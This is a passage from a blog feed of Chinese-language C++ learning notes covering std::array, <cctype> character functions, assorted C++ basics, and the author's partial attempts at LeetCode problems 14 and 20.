        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>c++11标准特性</li><li>IDE:vs 2022</li></ul><span id="more"></span><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>定义时必须指定大小，且不能使用变量指定</li><li>可以通过arry构造新的array，{}也合法</li><li>不可以使用数组构造，即arry &#x3D; ch是不合法的操作</li><li>本质上任然是一个固定大小的数组，不能删除或者添加元素。</li></ul><hr><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>如果使用了using namespace std，则后续代码可以无视std::<br>前期先保持基础写法。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在c语言和c++中，传统方式上定义一个数组可以用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> *ch2 = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>两者区别不大，前者由系统自动分配到栈区，后者在堆区上开辟空间并用指针指向它。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>使用array前，需引用头文件<array>;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::array&lt;<span class="type">int</span>, 2&gt; ary = &#123; <span class="number">0</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="comment">//或者不用=也一样</span></span><br><span class="line">std::array&lt;<span class="type">int</span>, 2&gt; ary2 &#123; <span class="number">0</span>,<span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><p>array内置size()方法，可以直接返回array数组有几个成员。</p><p>传统上我们需要知道数组的成员个数需要通过<code>sizeof(数组)/sizeof(数组类型或者数组首成员[0])</code>。</p><img src="/2022/04/30/std-array/003.png" class=""><hr><h2 id="fill"><a href="#fill" class="headerlink" title="fill()"></a>fill()</h2><p>可以说是一个初始化方法，根据括号内的值，将array数组所有成员都设置为括号内的值。<br>当然跟传统上的方法感觉差别不大。</p><img src="/2022/04/30/std-array/004.png" class=""><hr><h2 id="at"><a href="#at" class="headerlink" title="at()"></a>at()</h2><p>具有传统意义上索引作用，传统数组使用数组[0]来获取内容，而array数组则根据at(0)来返回，当然不是说arry数组就不能使用[]了，而是多了at()方法。</p><p>如果产生越界行为，如arry&lt;int,2&gt; arr，而你去访问arr.at(100),程序即产生错误抛出异常：</p><img src="/2022/04/30/std-array/000.png" class=""><p>传统定义的数组去访问越界时就有可能得到不正确的值，可以说是一种不安全的行为：</p><img src="/2022/04/30/std-array/001.png" class=""><hr><h2 id="x3D-x3D-重载"><a href="#x3D-x3D-重载" class="headerlink" title="&#x3D;&#x3D;重载"></a>&#x3D;&#x3D;重载</h2><img src="/2022/04/30/std-array/005.png" class=""><p>可以看到有意思的是，arrary数组相比较能返回真，而相同的int数组则返回假，当然底层离不开符号重载的实现。重载后面再说，我们可以浅看一下反汇编代码：<br>先打个断点：<img src="/2022/04/30/std-array/006.png" class=""><br>然后转到反汇编：<img src="/2022/04/30/std-array/007.png" class=""></p><p>首先就是array的反汇编代码比正常数组的代码少。<br>然后ch和ch1有一个cmp比较过程，但随后的jne好像是不等于就转移，然后后面就是一堆跟地址一样的操作</p><blockquote><p>汇编还没系统性学习，看个大概</p></blockquote><p>ary和ary2在call的时候有一个operator&#x3D;&#x3D;，这是符号重载的写法，也就是说这里肯定离不开重载，至于后面的目前也不是很清楚</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>内置的方法还有几个，涉及到容器的方面，等后面再补充吧。</p><p>封装好的东西固然功能多，在各方面会更完善，但也就意味着资源消耗的也多了。不过使用的前提还是看使用者，有这么个好东西知道就行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;cctype&gt;</title>
      <link href="/2022/04/28/cpp-cctype/"/>
      <url>/2022/04/28/cpp-cctype/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>cctype头文件</li></ul><span id="more"></span><hr><h1 id="包含的函数"><a href="#包含的函数" class="headerlink" title="包含的函数"></a>包含的函数</h1><table>    <tr>        <th colspan="2">字符处理函数</th>    </tr>    <tr>        <td>函数</td>        <td>说明</td>    <tr>    <tr>        <td>isupper(char)</td>        <td>如果参数是大写字母，函数返回true</td>    <tr>    <tr>        <td>islower(char)</td>        <td>如果参数是小写字母，函数返回true</td>    <tr>    <tr>        <td>isalpha(char)</td>        <td>如果参数是字母，函数返回true</td>    <tr>    <tr>        <td>isdigit(char)</td>        <td>如果参数是数字（0－9），函数返回true</td>    <tr>    <tr>        <td>isalnum(char)</td>        <td>如果参数是字母数字，即字母或者数字，函数返回true</td>    <tr>    <tr>        <td>isspace(char)</td>        <td>如果参数是标准空白字符，如空格、换行符、水平或垂直制表符，函数返回true</td>    <tr>    <tr>        <td>isblank(char)</td>        <td>如果参数是空格，则返回true</td>    <tr>    <tr>        <td>ispunct(char)</td>        <td>如果参数是标点符号，函数返回true</td>    <tr>    <tr>        <td>isprint(char)</td>        <td>如果参数是打印字符（包括空格），函数返回true</td>    <tr>    <tr>        <td>iscntrl(char)</td>        <td>如果参数是控制字符，函数返回true</td>    <tr>    <tr>        <td>isgraph(char)</td>        <td>如果参数是除空格之外的打印字符，函数返回true</td>    <tr>    <tr>        <td>tolower(char)</td>        <td>如果参数是大写字符，返回其小写，否则返回该参数</td>    <tr>    <tr>        <td>toupper(char)</td>        <td>如果参数是小写字符，返回其大写，否则返回该参数</td>    <tr></table><hr><h1 id="尝试输出一下代码"><a href="#尝试输出一下代码" class="headerlink" title="尝试输出一下代码"></a>尝试输出一下代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; c &lt;= <span class="number">127</span>; c++)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;ASCII为 &quot;</span> &lt;&lt; (<span class="type">int</span>)c &lt;&lt; <span class="string">&quot; 的字符为 &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">iscntrl</span>(c))&#123;<span class="comment">//判断是否为控制字符</span></span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">iscntrl</span>(c) ? <span class="string">&quot;控制字符  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isspace</span>(c) ? <span class="string">&quot;标准空白字符，如空格、换行符、水平或垂直制表符&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; (isblank(c) ? &quot;空格&quot;: &quot;&quot;);</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//非控制字符</span></span><br><span class="line">std::cout &lt;&lt; c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isprint</span>(c) ? <span class="string">&quot;打印字符(包括空格)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isgraph</span>(c) ? <span class="string">&quot;除空格之外的打印字符  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isalnum</span>(c) ? <span class="string">&quot;字母数字  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isalpha</span>(c) ? <span class="string">&quot;字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">islower</span>(c) ? <span class="string">&quot;小写字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isupper</span>(c) ? <span class="string">&quot;大写字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isdigit</span>(c) ? <span class="string">&quot;数字(0-9)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isxdigit</span>(c) ? <span class="string">&quot;十六进制数字(0-9,A-F,a-f)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">ispunct</span>(c) ? <span class="string">&quot;标点符号  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以在编译器自己尝试一下，基本概念对与ASCII码来说，小写a-z和大写A-Z和数字0-9我们是尽量记住范围会比较好<br>绝大部分看情况用得到在百度下就行了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cpp查漏补缺</title>
      <link href="/2022/04/25/cpp/"/>
      <url>/2022/04/25/cpp/</url>
      
        <content type="html"><![CDATA[<h1 id="查漏补缺随意版"><a href="#查漏补缺随意版" class="headerlink" title="查漏补缺随意版"></a>查漏补缺随意版</h1><p style="font-size:14px; text-align:right;">—— 有些记得住有些靠记录，至于看不看...</p><span id="more"></span><p>额。。兜兜转转感觉对安全之类的兴趣一般，还是又回头重拾c++了，说来也惭愧，c++倒是还记得点，qt框架因为当时b站只弄过一个翻金币的小游戏，所以经验不足。<br>先花点时间把c++重新过一遍，然后找qt项目练手~ 不然工作要g了。</p><hr><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><table><thead><tr><th align="center">语言</th><th align="center">转换过程</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">c++</td><td align="center">static_cast<type>(value)</td><td align="center">int a &#x3D; static_cast<int>(a+b)</td></tr><tr><td align="center">c</td><td align="center">type(value)</td><td align="center">int a &#x3D; int(a+b)</td></tr></tbody></table><hr><h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><table><thead><tr><th align="center">类型</th><th align="center">占用</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">1</td><td align="center">ascii字符</td></tr><tr><td align="center">wchar_t</td><td align="center">2</td><td align="center">宽字节字符</td></tr><tr><td align="center">char16_t</td><td align="center">2</td><td align="center">utf_16字符</td></tr><tr><td align="center">char32_t</td><td align="center">4</td><td align="center">utf_18字符</td></tr></tbody></table><blockquote><p>输入wchar_t变量时需要使用wcout输出，定义时需加L<br>16和32目前输出都是数字，区别在于占用的内存</p></blockquote><hr><h2 id="推断类型"><a href="#推断类型" class="headerlink" title="推断类型"></a>推断类型</h2><table><thead><tr><th align="center">auto</th></tr></thead><tbody><tr><td align="center">auto 变量名{初始值}</td></tr></tbody></table><blockquote><p>大多情况不会使用auto，因为c和c++都是强语言，他对变量的声明还是要求较为严格的</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">typeid</span>(变量).<span class="built_in">name</span>(); <span class="comment">//用于查看变量类型</span></span><br></pre></td></tr></table></figure><hr><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><table>    <tr>        <th colspan="2"> std::格式化输出 </th>    </tr>    <tr>        <td>Dec</td>        <td>以十进制格式显示后续数字</td>    </tr>    <tr>        <td>endl</td>        <td>写入新行并冲刷输出流</td>    </tr>    <tr>        <td>fixed</td>        <td>输出浮点数，例如3.1415926</td>    </tr>    <tr>        <td>flush</td>        <td>冲刷输出流</td>    </tr>    <tr>        <td>hex</td>        <td>以十六进制输入或输出</td>    </tr>    <tr>        <td>left</td>        <td>左对齐输出</td>    </tr>    <tr>        <td>oct</td>        <td>以八进制输入或输出</td>    </tr>    <tr>        <td>right</td>        <td>右对齐输出</td>    </tr>    <tr>        <td>scientific</td>        <td>使用科学表示法表示浮点数</td>    </tr>    <tr>        <td>setfill(ch)</td>        <td>使用 ch 填充字符</td>    </tr>    <tr>        <td>setprecision(n)</td>        <td>将浮点精度设置为n</td>    </tr>    <tr>        <td>setw(n)</td>        <td>将输出字段的宽度设置为n</td>    </tr>    <tr>        <td>showbase</td>        <td>打印数字时显示基数（进制）</td>    </tr>    <tr>        <td>noshowbase</td>        <td>打印数字时不要显示基数（进制）</td>    </tr>    <tr>        <td>showpoint</td>        <td>强制显示小数点和尾随零</td>    </tr>    <tr>        <td>noshowpoint</td>        <td>如果可能的话，不打印结尾零和小数点</td>    </tr>    <tr>        <td>showpos</td>        <td>在非负数前面打印一个加号</td>    </tr>    <tr>        <td>noshowpos</td>        <td>在非负数前面不打印加号</td>    </tr>    <tr>        <td>defaultfloat</td>        <td>恢复之前修改的浮点数计数方法和科学计数方法</td>    </tr></table><blockquote><p>个别如setprecision、setw、setfill使用时需要使用头文件iomanip</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//举个例子</span></span><br><span class="line">std::cout &lt;&lt; std::fixed;</span><br><span class="line">std::cout &lt;&lt; <span class="number">3.14</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果就是3.14000</span></span><br></pre></td></tr></table></figure><hr><h2 id="叼猫优先级"><a href="#叼猫优先级" class="headerlink" title="叼猫优先级"></a>叼猫优先级</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = b+++a;</span><br><span class="line">c = b---a;</span><br><span class="line">c = <span class="number">3</span>*-b+++a;</span><br><span class="line">c = <span class="number">2</span>*-b---a;</span><br></pre></td></tr></table></figure><blockquote><p>后缀优先原则，当出现多个+或者-的时候自动先匹配两个。<br>如c&#x3D;b+++a； 换做c &#x3D; (b++)+a;</p></blockquote><p>当然这种叼毛写法谁写谁哈皮，也就是无聊的考试官会出。不理解的可以通过vs去反汇编看执行顺序。</p><img src="/2022/04/25/cpp/000.png" class=""><img src="/2022/04/25/cpp/001.png" class=""><hr><h2 id="二进制流输出"><a href="#二进制流输出" class="headerlink" title="二进制流输出"></a>二进制流输出</h2><p>引入头文件<code>bitset</code><br>然后<code>std::cout &lt;&lt; std::bitset&lt;位数&gt;(变量)</code></p><hr><h2 id="c-for"><a href="#c-for" class="headerlink" title="c++ for"></a>c++ for</h2><p>众所周知，在c语言里面，循环打印数组需要：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> num[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sizof(num)/sizof(<span class="type">int</span>); i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,num[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然c++也能用上述的办法，但是还有一种更简洁的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i : num)&#123;</span><br><span class="line">        std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>与常用的c语言循环不同，cpp这种是用i作为变量挨个读取数组num的值，并且打印，而不再是用i做数组的索引</p></blockquote><p>当然需要注意i的类型是和数组类型一致的，如果不想操心，可以设置i为<code>auto i</code>,自适应相对而言省去不少烦恼了，但是如果要求严谨那么久严格遵循即可。</p><p>哦还要注意多维数组的情况,其实基本道理一样，只能在内嵌最深处使用<code>auto type: 数组</code>这样的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j:num[i])&#123;</span><br><span class="line">            std::cout &lt;&lt; j &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h2><p>传统赋值初始化的时候都是用&#x3D;号完成<br>c++其实可以用{}代替，</p><p>二者相比之下{}会相对更加严谨一点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b&#123;<span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><p>第一感观上就会像是给class赋值初始化，但是也并非只能给class用。</p><p>列表初始化也是c++11起的特性。<br><a href="https://zh.cppreference.com/w/cpp/language/list_initialization">参考链接</a></p><p>这里只是简单提一下，要详细理解的阅读一下参考链接的内容。</p><hr><h2 id="c-x2F-c-声明和定义的问题"><a href="#c-x2F-c-声明和定义的问题" class="headerlink" title="c&#x2F;c++ 声明和定义的问题"></a>c&#x2F;c++ 声明和定义的问题</h2><p>在C语言中，变量声明但是不定义是不占用内存空间的。如果调用了一个未初始化的变量，编译器会分配到一个垃圾值的问题。</p><img src="/2022/04/25/cpp/002.png" class=""><p>而c++，局部变量是必须要有定义的。除非使用extern做声明，这样才不用初始化。</p><hr><h2 id="UB"><a href="#UB" class="headerlink" title="UB"></a>UB</h2><p>UB全称<code>undefined behaviour.</code>，也就是常说的未定义行为</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第二十题</title>
      <link href="/2022/04/13/leetcodeno20/"/>
      <url>/2022/04/13/leetcodeno20/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>string</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><img src="/2022/04/13/leetcodeno20/000.png" class=""><p>三种类型的括号<br>要么按顺序两两一对，要么首尾一对对内嵌。</p><p>根据示例2</p><blockquote><p>输入：s &#x3D; “()[]{}”<br>输出：true</p></blockquote><p>示例4</p><blockquote><p>输入：s &#x3D; “{[]}”<br>输出：true</p></blockquote><p>看到具体效果。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>正常看到这个题目，原本是想通过string的replace去替换掉一组成员，然后循环判断，但是c++的replace不是很好使就算了。。。</p><p>那就按照关系，去看一下ASCII码，发现这几个括号之间相差1或2的情况。如下图第三列情况：</p><img src="/2022/04/13/leetcodeno20/004.png" class=""><img src="/2022/04/13/leetcodeno20/006.png" class=""><img src="/2022/04/13/leetcodeno20/005.png" class=""><p>那么在if关系中应该是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(s[i]+<span class="number">1</span> == s[i+i] || s[i]+<span class="number">2</span> == s[i+i]) </span><br></pre></td></tr></table></figure><blockquote><p>当然这种情况是括号两两一对按序排列的理想情况</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]+<span class="number">1</span> == s[i+<span class="number">1</span>] || s[i]+<span class="number">2</span> == s[i+<span class="number">1</span>])                          </span><br><span class="line">                n++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &lt; len/<span class="number">2</span> &amp;&amp; (s[i]+<span class="number">1</span> == s[len-i<span class="number">-1</span>] || s[i]+<span class="number">2</span> == s[len-i<span class="number">-1</span>]))      </span><br><span class="line">                n2++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (n == len/<span class="number">2</span> || n2 == len/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>其实这样写也有点不靠谱，两种情况放到一起有点不太明确，看着也会很奇怪。<br>第一种情况就是两两一对<br>第二种情况就是头尾一对往里推</p></blockquote><img src="/2022/04/13/leetcodeno20/001.png" class=""><p>测试一下这个案例没问题。</p><img src="/2022/04/13/leetcodeno20/007.png" class=""><blockquote><p>好家伙。。抛开头和尾，里面这样组合也确实是闭合的图形，突然给我整不会了。</p></blockquote><p><strong>思路一下子打不开了。。感觉陷进去了，挣扎了挺久的看了下评论区全是用栈的方式来弄，这样好像就没看到什么暴力解体的思路了，stack还没怎么用过不熟悉，看来这题要搁置先了</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第十四题</title>
      <link href="/2022/04/11/leetcodeno14/"/>
      <url>/2022/04/11/leetcodeno14/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续划水做做看</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>string<ul><li>length</li></ul></li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/11/leetcodeno14/000.png" class=""><p>看到这个就想用两个for跑，用一个string变量+&#x3D;。</p><p>初始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设第一层for循环跑strs的个数，第二个跑str[i]的长度，那么如果需要比较的话就又得多一层循环，三层其实有点多了，不是很好的办法。</p><p>……想了半天，既然是前缀之间的比较，那么假设循环的长度根据<code>strs[0].length()</code>，那么无论[0]的长度是最长还是最短，无非就三个结果，要么正好是他，要么是其中几个，要么都不是。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>()</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>replace那些用起来比较麻烦的感觉，创建一个新的string变量，找到公共的就+&#x3D;进去是暴力解法的第一步。<br>然后就是if的问题，我该怎么去判断，是和不是又该怎么处理。<br>如果说直接比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] == strs[j][i])</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br></pre></td></tr></table></figure><p>若是相等，直接让变量s+&#x3D;strs[0][i],乍一看还是很合理的，让我们找个示例测试一下：</p><img src="/2022/04/11/leetcodeno14/001.png" class=""><p>好家伙。。比strs[0]都长了。。逆天</p><p>整理了一下，问题在于s+&#x3D;不应该在if里面，因为相等的时候，i还没有变，j倒是自增了，就导致重复+i的情况。</p><p>那也就是说s+的过程应该放在内循环外面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[<span class="number">0</span>][i] == strs[j][i])</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br><span 